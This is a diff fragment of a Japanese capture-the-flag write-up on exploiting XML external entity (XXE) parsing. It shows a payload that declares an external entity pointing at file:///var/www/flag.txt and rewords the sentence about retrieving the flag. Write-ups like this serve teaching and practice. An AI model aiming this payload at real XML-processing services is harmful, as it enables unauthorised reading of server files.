@@ -19,7 +19,7 @@ XXEを狙う。
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///var/www/flag.txt" >]><foo>&xxe;</foo>
 ```
-アップロードし、読み取るとflagが得られた。  
+アップロードし、ファイルを確認するとflagが得られた。  
 flag  
 [flag.png](site/flag.png)  
 
